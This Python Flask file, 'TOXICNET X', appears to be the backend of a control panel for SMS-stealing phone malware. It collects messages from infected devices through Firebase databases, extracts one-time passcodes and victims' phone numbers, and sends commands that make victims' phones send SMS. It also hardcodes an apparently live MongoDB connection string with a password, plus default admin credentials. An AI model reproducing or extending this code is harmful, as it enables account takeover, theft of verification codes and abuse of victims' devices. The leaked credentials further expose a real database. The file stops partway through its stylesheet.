#!/usr/bin/env python3
"""
TOXICNET X — Vercel Edition (SuperMasterAdmin Routes)
Merged backend + Toxic Network dark UI + SMS Sender + SMS Logs + Passwordless.
"""

from flask import Flask, request, jsonify, session, redirect, url_for, Response
from functools import wraps
from pymongo import MongoClient
from bson import ObjectId
import requests, os, re, json, threading, time, hashlib
from collections import Counter
from datetime import datetime, timezone, timedelta

app = Flask(__name__)

# ════════════════════════════════════════════════════════════
# CONFIG
# ════════════════════════════════════════════════════════════
IS_VERCEL = bool(os.environ.get("VERCEL"))

app.secret_key = os.environ.get("SECRET_KEY", "toxicnet_secure_secret_2025_v23_x")

FB_HASH_SALT = os.environ.get("FB_HASH_SALT", "toxicnet_fb_secure_salt_2025_v23_x")

# MONGO URI
MONGO_URI = os.environ.get("MONGO_URI", "mongodb+srv://gogo_db_user:4DfbHqcjpjg6TYb8@firebase.snn8z2u.mongodb.net/?retryWrites=true&w=majority")

MESSAGE_CACHE_TTL = 10
MAX_SMS_PER_NUMBER = 60
FETCH_TIMEOUT = 10
FAST_FETCH_TIMEOUT = 10
MAX_PARALLEL = 10
MAX_DEVICES_PER_FB = int(os.environ.get("MAX_DEVICES_PER_FB", "300"))
MAX_OTP_URLS_VERCEL = 3
MAX_OTP_URLS_LOCAL = 20
MAX_SMS_BULK = 50
BG_REFRESH_INTERVAL = 60
IST = timezone(timedelta(hours=5, minutes=30))

# ════════════════════════════════════════════════════════════
# MONGO
# ════════════════════════════════════════════════════════════
MONGO_OK = False
mongo_client = db = fb_collection = settings_collection = sms_logs_collection = None


def fb_hash(url):
    return hashlib.sha256((FB_HASH_SALT + url.rstrip("/")).encode()).hexdigest()[:16]


def init_mongo():
    global MONGO_OK, mongo_client, db, fb_collection, settings_collection, sms_logs_collection
    if not MONGO_URI:
        return
    try:
        mongo_client = MongoClient(
            MONGO_URI,
            serverSelectionTimeoutMS=5000,
            connectTimeoutMS=5000,
            socketTimeoutMS=5000,
            maxPoolSize=10,
        )
        db = mongo_client["otp_panel"]
        fb_collection = db["firebases"]
        settings_collection = db["settings"]
        sms_logs_collection = db["sms_logs"]
        mongo_client.admin.command("ping")
        MONGO_OK = True
        print("MongoDB connected")
    except Exception as e:
        print(f"MongoDB: {e}")


init_mongo()

DEFAULT_USER_PWD = "User@2025"
DEFAULT_ADMIN_PWD = "Admin@2025"


def get_pwd(role):
    if MONGO_OK:
        try:
            doc = settings_collection.find_one({"_id": f"{role}_password"})
            if doc and doc.get("value"):
                return doc["value"]
        except Exception:
            pass
    return DEFAULT_USER_PWD if role == "user" else DEFAULT_ADMIN_PWD


def set_pwd(role, value):
    if not MONGO_OK:
        return False
    try:
        settings_collection.update_one(
            {"_id": f"{role}_password"},
            {"$set": {"value": value, "updated_at": int(time.time())}},
            upsert=True,
        )
        return True
    except Exception:
        return False


def get_setting(key, default=None):
    if not MONGO_OK:
        return default
    try:
        doc = settings_collection.find_one({"_id": key})
        return doc["value"] if doc else default
    except Exception:
        return default


def set_setting(key, value):
    if not MONGO_OK:
        return False
    try:
        settings_collection.update_one(
            {"_id": key},
            {"$set": {"value": value, "updated_at": int(time.time())}},
            upsert=True,
        )
        return True
    except Exception:
        return False


def get_panel_state():
    return get_setting("panel_state", "active")


def get_sms_sender_enabled():
    return bool(get_setting("sms_sender_enabled", True))


# ════════════════════════════════════════════════════════════
# CACHE
# ════════════════════════════════════════════════════════════
cache = {
    "numbers_map": {},
    "devices": {},
    "device_messages": {},
    "msg_cache_time": {},
    "stats": {"total": 0, "online": 0, "offline": 0, "otp_rate": 0},
    "last_update": 0,
    "loading": False,
    "progress": {"done": 0, "total": 0},
    "lock": threading.Lock(),
    "inbox_locks": {},
    "fb_stats": {},
    "fb_stats_time": 0,
}

# ════════════════════════════════════════════════════════════
# CONSTANTS
# ════════════════════════════════════════════════════════════
MSG_FIELDS = {"message","body","text","msg","content","messagetext","messagebody","sms","smsbody","smscontent","smsbodytext","lastmessage","fullmessage","sms_message","msgbody"}
TIME_FIELDS = {"timestamp","time","date","receivedtime","datetime","createdat","senttime","smstime","devicetime","date_time","received_time","sent_time","sms_time","device_time","smsdate","receivedat","sentat","lastmessagetime","recvtime","logtime","event_time"}
SENT_KEYS = {"command","commands","sendsms","action","webhookevent","send_sms","sentsms","outgoing"}
INCOMING_TYPES = {"incoming","received","inbox","recv","in"}


# ════════════════════════════════════════════════════════════
# HELPERS
# ════════════════════════════════════════════════════════════
def digits_only(s):
    return re.sub(r"\D", "", str(s) if s is not None else "")


def normalize_number(n):
    d = digits_only(n)
    return d[-10:] if len(d) >= 10 else d


def extract_real_numbers_from_message(message):
    if not message:
        return []
    text = re.sub(r'\d{3,4}[Xx*]{2,6}\d{2,4}', ' ', str(message))
    found, seen = [], set()
    for m in re.finditer(r'\+91[\s\-]?([6-9]\d{9})', text):
        if m.group(1) not in seen:
            seen.add(m.group(1))
            found.append(m.group(1))
    for m in re.finditer(r'(?<!\d)([6-9]\d{9})(?!\d)', text):
        if m.group(1) not in seen:
            seen.add(m.group(1))
            found.append(m.group(1))
    return found


def parse_date_string(s):
    if not s or not isinstance(s, str):
        return 0
    try:
        m = re.match(r"(\d{1,2})-(\d{1,2})-(\d{4})\s*\|\s*(\d{1,2}):(\d{2})\s*(am|pm)", s.strip(), re.IGNORECASE)
        if not m:
            return 0
        d, mo, y, h, mi, ap = m.groups()
        h = int(h)
        if ap.lower() == "pm" and h != 12:
            h += 12
        if ap.lower() == "am" and h == 12:
            h = 0
        return int(datetime(int(y), int(mo), int(d), h, int(mi), tzinfo=IST).timestamp())
    except Exception:
        return 0


def collect_all_messages(obj, found=None, depth=0, parent_ts=0, parent_key=""):
    if found is None:
        found = []
    if depth > 10:
        return found
    pk = parent_key.lower()
    if any(k in pk for k in SENT_KEYS):
        return found
    if isinstance(obj, dict):
        kl = {k.lower() for k in obj.keys()}
        if bool(kl & MSG_FIELDS):
            def g(fs):
                for k in obj:
                    if k.lower() in fs:
                        return obj[k]
                return None
            body = g(MSG_FIELDS)
            from_val = None
            for k in obj:
                if k.lower() in ("sender", "from", "origin", "address", "src"):
                    v = obj[k]
                    if v and isinstance(v, str) and v.strip():
                        from_val = v.strip()
                        break
            to_val = None
            for k in obj:
                if k.lower() in ("to", "destination", "receiver"):
                    to_val = obj[k]
                    break
            date_str = None
            for k in obj:
                kl2 = k.lower()
                if kl2 in ("datetime", "date_time", "date", "datetimestr"):
                    v = obj[k]
                    if isinstance(v, str) and ("|" in v or "am" in v.lower() or "pm" in v.lower()):
                        date_str = v
                        break
            msg_id = obj.get("id")
            ts = parse_date_string(date_str) if date_str else 0
            if not ts:
                traw = g(TIME_FIELDS)
                if traw:
                    try:
                        ts = int(traw)
                        if ts > 1e12:
                            ts //= 1000
                    except Exception:
                        ts = 0
            if not ts and msg_id:
                try:
                    mid = int(msg_id)
                    ts = mid // 1000 if mid > 1e12 else (mid if mid > 1e9 else 0)
                except Exception:
                    pass
            if not ts:
                ts = parent_ts
            mt = str(obj.get("type", "")).lower().strip()
            is_sent = obj.get("isSended") if "isSended" in obj else obj.get("isSent")
            keep = False
            if mt in INCOMING_TYPES:
                keep = True
            elif mt in ("sent", "outgoing"):
                keep = False
            elif is_sent is True:
                keep = False
            elif is_sent is False:
                keep = True
            elif from_val and not to_val:
                keep = True
            elif to_val and not from_val:
                keep = False
            elif not to_val and not from_val:
                keep = True
            if keep and body:
                found.append({
                    "from": str(from_val or "Unknown"),
                    "to": str(to_val) if to_val else "",
                    "message": str(body),
                    "timestamp": ts,
                    "date_string": date_str,
                    "id": msg_id,
                    "type": "received",
                })
        for k, v in obj.items():
            if any(x in k.lower() for x in SENT_KEYS):
                continue
            cts = parent_ts
            try:
                tk = int(k)
                cts = tk // 1000 if tk > 1e12 else (tk if tk > 1e9 else parent_ts)
            except Exception:
                pass
            collect_all_messages(v, found, depth + 1, cts, k)
    elif isinstance(obj, list):
        for it in obj:
            collect_all_messages(it, found, depth + 1, parent_ts, parent_key)
    return found


def extract_otp(text):
    if not text:
        return ""
    for pat in [
        r"(?:otp|one[- ]time|password|code|pin|verification|passcode)[^\d]{0,30}(\d{4,8})",
        r"(\d{4,8})[^\d]{0,30}(?:is your|otp|one[- ]time|code)",
        r"#(\d{4,8})",
    ]:
        m = re.search(pat, text, re.IGNORECASE)
        if m:
            return m.group(1)
    return ""


def is_online(info):
    if not isinstance(info, dict):
        return False
    if any(info.get(k) is True for k in ("status", "isOnline", "online", "connected")):
        return True
    if info.get("status") in ("online", "active", 1):
        return True
    if info.get("lastSeen"):
        try:
            if time.time() - int(info["lastSeen"]) < 600:
                return True
        except Exception:
            pass
    return False


def find_real_number_from_messages(all_msgs):
    counter = Counter()
    senders = set()
    for m in all_msgs:
        s = m.get("from", "")
        if s:
            for sn in extract_real_numbers_from_message(s):
                senders.add(sn)
    for m in all_msgs:
        if m.get("type") != "received":
            continue
        for n in extract_real_numbers_from_message(m.get("message", "")):
            if n in senders or n.startswith(("1800", "1900", "1991")):
                continue
            counter[n] += 1
    return counter.most_common(10)


def _finalize_device(name, online, sims, msgs, dev_data):
    seen, unique = set(), []
    for m in msgs:
        h = f"{m.get('from','')}|{m.get('message','')[:80]}|{m.get('timestamp',0)}"
        if h in seen:
            continue
        seen.add(h)
        unique.append(m)
    unique.sort(key=lambda x: x.get("timestamp", 0) or 0, reverse=True)
    unique = unique[:MAX_SMS_PER_NUMBER]
    per_number = {n["number"]: [] for n in sims}
    if sims:
        per_number[sims[0]["number"]] = unique[:]
    for num in per_number:
        per_number[num].sort(key=lambda x: x.get("timestamp", 0) or 0, reverse=True)
        per_number[num] = per_number[num][:MAX_SMS_PER_NUMBER]
    return {
        "name": name,
        "online": online,
        "sims": sims,
        "battery": dev_data.get("battery", 0) if isinstance(dev_data, dict) else 0,
        "messages": unique,
        "per_number": per_number,
        "total_msgs": len(unique),
        "total_otp": sum(1 for m in unique if extract_otp(m.get("message", ""))),
    }


_tl = threading.local()


def _sess():
    if not hasattr(_tl, "s"):
        s = requests.Session()
        s.headers.setdefault("User-Agent", "Mozilla/5.0")
        _tl.s = s
    return _tl.s


def try_json(url, timeout=FETCH_TIMEOUT):
    try:
        r = _sess().get(url, timeout=timeout)
        if r.status_code != 200:
            return None
        t = r.text.strip()
        if not t or t == "null":
            return None
        return json.loads(t)
    except Exception:
        return None


def try_post(url, payload, timeout=FETCH_TIMEOUT):
    try:
        r = _sess().post(url, json=payload, timeout=timeout)
        return {"status": r.status_code, "body": r.text[:500]}
    except Exception as e:
        return {"status": 0, "error": str(e)}


def fetch_device_ids(fb_url):
    base = fb_url.rstrip("/")
    for path in ["/clients.json?shallow=true", "/clients.json", "/devices.json?shallow=true", "/devices.json"]:
        data = try_json(base + path)
        if isinstance(data, dict):
            return list(data.keys())
    return []


def fetch_device_data(fb_url, dev_id):
    base = fb_url.rstrip("/")
    for p in [f"/clients/{dev_id}.json", f"/devices/{dev_id}.json", f"/{dev_id}.json"]:
        data = try_json(base + p)
        if isinstance(data, dict):
            return data
    return None


def fetch_messages_multi_path(fb_url, dev_id, phone_numbers=None):
    base = fb_url.rstrip("/")
    all_msgs, seen = [], set()
    data = try_json(f'{base}/messages/{dev_id}.json?orderBy="$key"&limitToLast=60', timeout=FAST_FETCH_TIMEOUT)
    if not data:
        data = try_json(f'{base}/messages/{dev_id}.json', timeout=30)
    if data and isinstance(data, dict):
        for m in collect_all_messages(data):
            h = f"{m.get('from','')}|{m.get('message','')[:80]}|{m.get('timestamp',0)}"
            if h in seen:
                continue
            seen.add(h)
            all_msgs.append(m)
    all_msgs.sort(key=lambda x: x.get("timestamp", 0) or 0, reverse=True)
    return all_msgs[:MAX_SMS_PER_NUMBER]


def fetch_devices_from_one_fb(fb_url, fb_name="", fb_id=""):
    out = []
    device_ids = fetch_device_ids(fb_url)
    if len(device_ids) > MAX_DEVICES_PER_FB:
        device_ids = device_ids[:MAX_DEVICES_PER_FB]
    for did in device_ids:
        raw = fetch_device_data(fb_url, did)
        if not raw:
            continue
        msgs = fetch_messages_multi_path(fb_url, did)
        inner = collect_all_messages(raw)
        existing = {f"{m.get('from','')}|{m.get('message','')[:80]}|{m.get('timestamp',0)}" for m in msgs}
        for m in inner:
            h = f"{m.get('from','')}|{m.get('message','')[:80]}|{m.get('timestamp',0)}"
            if h not in existing:
                msgs.append(m)
                existing.add(h)
        msgs.sort(key=lambda x: x.get("timestamp", 0) or 0, reverse=True)
        msgs = msgs[:MAX_SMS_PER_NUMBER]
        online = is_online(raw)
        name = did[:16]
        for f in ["deviceName", "device_name", "name", "model", "deviceModel", "brand", "manufacturer", "phoneName", "phoneModel", "deviceInfo", "productName", "hardware", "deviceBrand"]:
            v = raw.get(f) if isinstance(raw, dict) else None
            if v and isinstance(v, str) and v.strip():
                name = v.strip()[:25]
                break
        top = find_real_number_from_messages(msgs)
        sims = ([{"slot": 0, "number": top[0][0], "online": online, "confidence": top[0][1]}]
                if top else [{"slot": 0, "number": "UNKNOWN-" + did[:6], "online": online, "confidence": 0}])
        dev = _finalize_device(name, online, sims, msgs, raw)
        dev.update({"id": did, "firebase": fb_url, "fb_name": fb_name, "fb_id": fb_id})
        out.append(dev)
    return out


def merge_numbers_into_cache(devices):
    with cache["lock"]:
        for dev in devices:
            is_on = dev.get("online", False)
            for sim in dev.get("sims", []):
                num = sim["number"]
                key = num if num.startswith("UNKNOWN-") else normalize_number(num)
                if not key or (not num.startswith("UNKNOWN-") and len(key) != 10):
                    continue
                msgs = dev.get("per_number", {}).get(num, [])
                otp_c = sum(1 for m in msgs if extract_otp(m.get("message", "")))
                if key not in cache["numbers_map"]:
                    cache["numbers_map"][key] = {
                        "number": num,
                        "device_id": dev["id"],
                        "device_name": dev.get("name", ""),
                        "firebase": dev.get("firebase", ""),
                        "fb_id": dev.get("fb_id", ""),
                        "fb_name": dev.get("fb_name", ""),
                        "online": is_on,
                        "msg_count": len(msgs),
                        "otp_count": otp_c,
                        "battery": dev.get("battery", "?"),
                        "confidence": sim.get("confidence", 0),
                    }
                else:
                    ex = cache["numbers_map"][key]
                    if sim.get("confidence", 0) > ex.get("confidence", 0):
                        ex["number"] = num
                        ex["confidence"] = sim.get("confidence", 0)
                    if len(msgs) > ex["msg_count"]:
                        ex.update({
                            "device_id": dev["id"],
                            "device_name": dev.get("name", ""),
                            "firebase": dev.get("firebase", ""),
                            "fb_id": dev.get("fb_id", ""),
                            "fb_name": dev.get("fb_name", ""),
                            "msg_count": len(msgs),
                            "otp_count": otp_c,
                            "online": is_on,
                        })
                    elif is_on and not ex["online"]:
                        ex["online"] = True
            cache["devices"][f"{dev['firebase']}|{dev['id']}"] = dev
        nums = list(cache["numbers_map"].values())
        online = sum(1 for n in nums if n.get("online"))
        t_otp = sum(n.get("otp_count", 0) for n in nums)
        t_msg = sum(n.get("msg_count", 0) for n in nums)
        cache["stats"] = {
            "total": len(nums),
            "online": online,
            "offline": len(nums) - online,
            "otp_rate": int((t_otp / t_msg) * 100) if t_msg > 0 else 0,
        }


def fetch_fb_stats():
    if not MONGO_OK:
        return
    try:
        firebases = list(fb_collection.find({}))
    except Exception:
        return
    results = {}
    sem = threading.Semaphore(MAX_PARALLEL)

    def worker(fb):
        with sem:
            url = fb.get("url", "")
            fb_id = str(fb.get("_id", ""))
            if not url:
                results[fb_id] = {"online": 0, "offline": 0, "devices": 0}
                return
            try:
                devs = fetch_devices_from_one_fb(url, fb.get("name", ""), fb_id)
                on = sum(1 for d in devs if d.get("online"))
                results[fb_id] = {"online": on, "offline": len(devs) - on, "devices": len(devs)}
            except Exception:
                results[fb_id] = {"online": 0, "offline": 0, "devices": 0}

    ts = [threading.Thread(target=worker, args=(fb,), daemon=True) for fb in firebases]
    for t in ts:
        t.start()
    for t in ts:
        t.join(timeout=25)
    with cache["lock"]:
        cache["fb_stats"] = results
        cache["fb_stats_time"] = time.time()


def fetch_all_devices():
    if not MONGO_OK:
        return
    try:
        firebases = list(fb_collection.find({}))
    except Exception:
        return
    with cache["lock"]:
        cache["progress"] = {"done": 0, "total": len(firebases)}
    sem = threading.Semaphore(MAX_PARALLEL)

    def worker(fb):
        with sem:
            url = fb.get("url", "")
            if not url:
                with cache["lock"]:
                    cache["progress"]["done"] += 1
                return
            try:
                devs = fetch_devices_from_one_fb(url, fb.get("name", ""), str(fb.get("_id", "")))
                merge_numbers_into_cache(devs)
            except Exception as e:
                print(f"worker err {url}: {e}")
            with cache["lock"]:
                cache["progress"]["done"] += 1

    ts = [threading.Thread(target=worker, args=(fb,), daemon=True) for fb in firebases]
    for t in ts:
        t.start()
    for t in ts:
        t.join(timeout=25)


def refresh_cache(force=False):
    with cache["lock"]:
        if cache["loading"] and not force:
            return False
        cache["loading"] = True
        cache["numbers_map"] = {}
        cache["devices"] = {}
        cache["stats"] = {"total": 0, "online": 0, "offline": 0, "otp_rate": 0}
    try:
        fetch_all_devices()
        fetch_fb_stats()
        with cache["lock"]:
            cache["last_update"] = time.time()
        return True
    except Exception as e:
        print(f"refresh err: {e}")
        return False
    finally:
        with cache["lock"]:
            cache["loading"] = False


if not IS_VERCEL:
    def _bg():
        time.sleep(5)
        while True:
            try:
                refresh_cache()
            except Exception:
                pass
            time.sleep(BG_REFRESH_INTERVAL)
    threading.Thread(target=_bg, daemon=True).start()


# ════════════════════════════════════════════════════════════
# SMS SENDER
# ════════════════════════════════════════════════════════════
def send_sms_via_device(fb_url, dev_id, target, message):
    base = fb_url.rstrip("/")
    payload = {
        "to": target,
        "number": target,
        "phone": target,
        "message": message,
        "text": message,
        "sms": message,
        "type": "sendSms",
        "command": "sendSms",
        "action": "send_sms",
        "timestamp": int(time.time()),
    }
    attempts = []
    for path in [
        f"/commands/{dev_id}.json",
        f"/clients/{dev_id}/commands.json",
        f"/devices/{dev_id}/commands.json",
        f"/clients/{dev_id}/sendSms.json",
    ]:
        res = try_post(base + path, payload, timeout=8)
        attempts.append({"path": path, "result": res})
        if res.get("status") == 200 and res.get("body", "").strip():
            return {"success": True, "via": path, "attempts": attempts}
    return {"success": False, "attempts": attempts}


# ════════════════════════════════════════════════════════════
# AUTH
# ════════════════════════════════════════════════════════════
def login_required(f):
    @wraps(f)
    def w(*a, **kw):
        state = get_panel_state()
        if state == "inactive" and session.get("role") != "admin":
            if request.path.startswith("/api/"):
                return jsonify({"success": False, "error": "Panel inactive"}), 403
            return redirect(url_for("login_page"))
        if not session.get("logged_in"):
            if state == "pwdless":
                session["logged_in"] = True
                session["role"] = "user"
            else:
                if request.path.startswith("/api/"):
                    return jsonify({"success": False, "error": "Login required"}), 401
                return redirect(url_for("login_page"))
        return f(*a, **kw)
    return w


def admin_required(f):
    @wraps(f)
    def w(*a, **kw):
        if not session.get("logged_in") or session.get("role") != "admin":
            if request.path.startswith("/api/"):
                return jsonify({"success": False, "error": "Admin required"}), 401
            return redirect(url_for("admin_login_page"))
        return f(*a, **kw)
    return w


# ════════════════════════════════════════════════════════════
# SHARED CSS
# ════════════════════════════════════════════════════════════
DARK_CSS = """
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;font-family:'Inter',system-ui,-apple-system,sans-serif}
html,body{overscroll-behavior-y:contain;background:#0f172a;color:#f1f5f9;min-height:100vh;line-height:1.5;-webkit-font-smoothing:antialiased}
body{padding-bottom:env(safe-area-inset-bottom)}
input,button,textarea,select{font-size:16px !important;-webkit-appearance:none;border-radius:10px;font-family:inherit;outline:none}
button{touch-action:manipulation;cursor:pointer;border:none;transition:all 0.2s ease}
a{-webkit-tap-highlight-color:transparent;text-decoration:none;color:inherit}
::selection{background:#3b82f6;color:#fff}
::-webkit-scrollbar{width:6px;height:6px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:#334155;border-radius:4px}
@keyframes spin{to{transform:rotate(360deg)}}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
@keyframes slideUp{from{opacity:0;transform:translateY(15px)}to{opacity:1;transform:translateY(0)}}
@keyframes fadeIn{from{opacity:0}to{opacity:1}}
.spinner{display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,0.2);border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite}
.pulse-dot{width:8px;height:8px;border-radius:50%;background:#10b981;animation:pulse 1.5s infinite;display:inline-block}
.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(100px);background:#1e293b;color:#fff;padding:12px 24px;border-radius:12px;font-weight:600;font-size:14px;box-shadow:0 10px 25px rgba(0,0,0,0.5);z-index:9999;transition:transform .3s cubic-bezier(0.4,0,0.2,1);pointer-events:none;max-width:90vw;text-align:center;border:1px solid #334155}
.toast.show{transform:translateX(-50%) translateY(0)}
.hidden{display:none !important}
.app{background:#0f172a;color:#f1f5f9;padding:0 0 80px}
.topbar{background:#1e293b;border-bottom:1px solid #334155;padding:16px 20px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;padding-top:calc(16px + env(safe-area-inset-top));gap:10px;flex-wrap:wrap}
.brand{font-size:20px;font-weight:800;letter-spacing:-0.5px;display:flex;align-items:center;gap:8px}
.brand span{color:#3b82f6}
.top-actions{display:flex;align-items:center;gap:12px}
.refresh-btn{background:#334155;color:#f1f5f9;width:40px;height:40px;border-radius:12px;font-size:18px;display:flex;align-items:center;justify-content:center;transition:.2s}
.refresh-btn:hover{background:#475569}
.refresh-btn.spinning{animation:spin 1s linear infinite}
.conn{display:flex;align-items:center;gap:8px;font-size:12px;font-weight:600;padding:8px 12px;border-radius:10px;background:#0f172a;border:1px solid #334155;color:#94a3b8}
.conn.online{color:#10b981;border-color:rgba(16,185,129,.3);background:rgba(16,185,129,.05)}
.conn .dot{width:8px;height:8px;border-radius:50%;background:currentColor}
.conn.online .dot{animation:pulse 1.5s infinite}
.nav{display:flex;gap:8px;padding:16px 20px 0;overflow-x:auto;scrollbar-width:none}
.nav::-webkit-scrollbar{display:none}
.nav-link{padding:10px 20px;border-radius:12px;font-size:14px;font-weight:600;color:#94a3b8;background:#1e293b;border:1px solid #334155;cursor:pointer;transition:.2s;white-space:nowrap;display:flex;align-items:center;gap:8px;text-decoration:none}
.nav-link:hover{color:#f1f5f9;border-color:#475569}
.nav-link.active{background:#3b82f6;color:#fff;border-color:#3b82f6;box-shadow:0 4px 12px rgba(59,130,246,.3)}
.container{max-width:900px;margin:0 auto;padding:20px}
.session-banner{background:linear-gradient(135deg,rgba(16,185,129,.1),rgba(59,130,246,.1));border:1px solid rgba(16,185,129,.2);border-radius:12px;padding:14px 20px;margin-bottom:20px;display:flex;align-items:center;gap:12px;font-size:14px;font-weight:600;color:#10b981;animation:fadeIn 0.5s ease}
.stats{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:20px}
@media(min-width:600px){.stats{grid-template-columns:repeat(4,1fr)}}
.stat{background:#1e293b;border:1px solid #334155;border-radius:16px;padding:18px;position:relative;overflow:hidden;transition:.3s;animation:slideUp 0.5s ease both}
.stat .label{font-size:11px;color:#94a3b8;font-weight:700;letter-spacing:1px;text-transform:uppercase;margin-bottom:8px}
.stat .value{font-size:28px;font-weight:800;letter-spacing:-1px}
.stat.total .value{color:#3b82f6}
.stat.online .value{color:#10b981}
.stat.offline .value{color:#ef4444}
.stat.otp{display:flex;flex-direction:column;justify-content:center;align-items:center}
.circular-chart{display:block;margin:0 auto;max-width:50px;max-height:50px}
.circle-bg{fill:none;stroke:#334155;stroke-width:3.8}
.circle{fill:none;stroke-width:3.8;stroke-linecap:round;stroke:#8b5cf6;transition:stroke-dasharray 1s ease-out}
.otp-text{font-size:14px;font-weight:800;fill:#f1f5f9;text-anchor:middle;dominant-baseline:middle}
.filter-bar{display:flex;gap:10px;margin-bottom:20px;background:#1e293b;padding:8px;border-radius:16px;border:1px solid #334155}
.filter-btn{flex:1;padding:10px;border-radius:10px;font-size:13px;font-weight:600;color:#94a3b8;background:transparent;transition:.2s;display:flex;align-items:center;justify-content:center;gap:6px}
.filter-btn:hover{color:#f1f5f9}
.filter-btn.active{background:#334155;color:#f1f5f9;box-shadow:0 2px 4px rgba(0,0,0,0.1)}
.filter-btn.active.online-filter{background:rgba(16,185,129,.15);color:#10b981;border:1px solid rgba(16,185,129,.3)}
.filter-btn.active.offline-filter{background:rgba(239,68,68,.15);color:#ef4444;border:1px solid rgba(239,68,68,.3)}
.search-box{margin-bottom:20px;position:relative}
.search-box input{width:100%;padding:16px 20px 16px 48px;border-radius:16px;border:1px solid #334155;background:#1e293b;color:#f1f5f9;font-size:15px;transition:.2s}
.search-box input:focus{border-color:#3b82f6;box-shadow:0 0 0 4px rgba(59,130,246,.1)}
.search-box::before{content:"🔍";position:absolute;left:18px;top:50%;transform:translateY(-50%);font-size:16px;opacity:0.5}
.list-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px}
.list-header h2{font-size:18px;font-weight:700}
.count{font-size:12px;font-weight:700;color:#3b82f6;background:rgba(59,130,246,.1);padding:4px 12px;border-radius:20px}
.num-card{background:#1e293b;border:1px solid #334155;border-radius:16px;padding:16px;margin-bottom:12px;display:flex;align-items:center;gap:16px;transition:.2s;animation:slideUp 0.3s ease both}
.num-card:hover{border-color:#475569;box-shadow:0 4px 12px rgba(0,0,0,0.1);transform:translateY(-2px)}
.num-icon{width:48px;height:48px;border-radius:14px;display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:700;flex-shrink:0;background:rgba(16,185,129,.1);color:#10b981;border:1px solid rgba(16,185,129,.2)}
.num-icon.offline-icon{background:rgba(239,68,68,.1);color:#ef4444;border-color:rgba(239,68,68,.2)}
.num-icon.unknown-icon{background:rgba(148,163,184,.1);color:#94a3b8;border-color:rgba(148,163,184,.2)}
.num-info{flex:1;min-width:0;cursor:pointer}
.num-title{font-size:16px;font-weight:700;color:#f1f5f9;margin-bottom:6px;display:flex;align-items:center;gap:8px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.num-title.unknown{color:#94a3b8;font-style:italic;font-weight:500}
.num-sub{display:flex;gap:8px;flex-wrap:wrap}
.pill{font-size:11px;font-weight:600;padding:4px 10px;border-radius:8px;background:#0f172a;color:#94a3b8;border:1px solid #334155;display:inline-flex;align-items:center;gap:4px}
.pill.otp{background:rgba(139,92,246,.1);color:#8b5cf6;border-color:rgba(139,92,246,.2)}
.pill.on{background:rgba(16,185,129,.1);color:#10b981}
.pill.off{background:rgba(239,68,68,.1);color:#ef4444}
.pill.dev{background:rgba(59,130,246,.1);color:#3b82f6}
.badge{display:inline-flex;align-items:center;gap:6px;font-size:12px;font-weight:700;padding:6px 12px;border-radius:10px;flex-shrink:0}
.badge.online{background:rgba(16,185,129,.1);color:#10b981;border:1px solid rgba(16,185,129,.2)}
.badge.offline{background:rgba(239,68,68,.1);color:#ef4444;border:1px solid rgba(239,68,68,.2)}
.badge .dot{width:6px;height:6px;border-radius:50%;background:currentColor}
.badge.online .dot{animation:pulse 1.5s infinite}
.card-actions{display:flex;gap:8px;flex-shrink:0}
.icon-btn{width:40px;height:40px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:18px;background:#334155;color:#f1f5f9;transition:.2s}
.icon-btn:hover{background:#475569}
.icon-btn.send-btn{background:#3b82f6;color:#fff;box-shadow:0 4px 10px rgba(59,130,246,.3)}
.icon-btn.send-btn:hover{background:#2563eb}
.sms-sender-box{background:#1e293b;border:1px solid #334155;border-radius:20px;padding:24px;margin-bottom:24px;animation:slideUp 0.4s ease}
.sms-sender-box h2{font-size:18px;font-weight:700;margin-bottom:8px;display:flex;align-items:center;gap:10px}
.sms-sender-box p{font-size:14px;color:#94a3b8;margin-bottom:20px}
.form-group{margin-bottom:16px}
.form-group label{display:block;font-size:12px;font-weight:600;color:#94a3b8;margin-bottom:8px}
.form-group input,.form-group textarea{width:100%;padding:14px 16px;border-radius:12px;border:1px solid #334155;background:#0f172a;color:#f1f5f9;font-size:15px;transition:.2s}
.form-group input:focus,.form-group textarea:focus{border-color:#3b82f6;box-shadow:0 0 0 4px rgba(59,130,246,.1)}
.form-group textarea{resize:vertical;min-height:100px}
.btn{padding:16px;border-radius:12px;font-size:15px;font-weight:700;transition:.2s;display:flex;align-items:center;justify-content:center;gap:8px;width:100%}
.btn-primary{background:#3b82f6;color:#fff}
.btn-primary:hover{background:#2563eb;box-shadow:0 8px 16px rgba(59,130,246,.2)}
.btn-primary:disabled{opacity:.6;cursor:not-allowed;box-shadow:none}
.btn-gray{background:#334155;color:#f1f5f9}
.btn.green{background:#10b981;color:#fff}
.btn.warning{background:#ef4444;color:#fff}
.btn.primary{background:#f59e0b;color:#fff}
.btn.gray{background:#334155;color:#f1f5f9}
.warning-box{background:rgba(245,158,11,.1);border:1px solid rgba(245,158,11,.3);border-radius:12px;padding:14px;margin-bottom:20px;font-size:12px;color:#f59e0b;line-height:1.5;font-weight:500}
.warning-box code{background:#0f172a;padding:2px 6px;border-radius:4px;font-size:11px}
.inbox-header{background:#1e293b;border:1px solid #334155;border-radius:20px;padding:20px;margin-bottom:16px;display:flex;align-items:center;gap:16px;animation:slideUp 0.3s ease}
.back-btn{width:44px;height:44px;border-radius:12px;background:#0f172a;border:1px solid #334155;color:#f1f5f9;display:flex;align-items:center;justify-content:center;font-size:20px;transition:.2s}
.back-btn:hover{background:#334155}
.inbox-num{font-size:20px;font-weight:800;margin-bottom:4px}
.inbox-status{font-size:12px;font-weight:600;color:#10b981;display:flex;align-items:center;gap:6px}
.sms-list{display:flex;flex-direction:column;gap:12px}
.sms-item{background:#1e293b;border:1px solid #334155;border-radius:16px;padding:18px;animation:slideUp 0.3s ease}
.sms-item.fresh{border-left:4px solid #3b82f6}
.sms-head{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:10px}
.sender{font-size:14px;font-weight:700;color:#f1f5f9}
